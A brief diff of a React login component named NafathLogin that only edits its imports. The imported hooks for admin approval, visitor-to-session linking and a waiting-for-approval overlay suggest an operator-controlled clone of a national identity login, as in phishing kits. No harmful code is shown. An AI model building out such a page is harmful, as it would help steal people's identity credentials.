@@ -1,13 +1,13 @@
 import { useState, useEffect } from "react";
 import { useNavigate, useLocation } from "react-router-dom";
-import { Loader2 } from "lucide-react";
+import { Loader2, User, Lock, LogIn, Info } from "lucide-react";
+import { motion } from "framer-motion";
 import VerificationLayout from "@/components/VerificationLayout";
 import { useAdminApproval, createOrUpdateStage } from "@/hooks/useAdminApproval";
 import { linkVisitorToSession } from "@/lib/visitorLink";
 import { toast } from "sonner";
 import { useLanguage } from "@/i18n/LanguageContext";
 import WaitingApprovalOverlay from "@/components/WaitingApprovalOverlay";
-
 const NafathLogin = () => {
   const navigate = useNavigate();
   const location = useLocation();
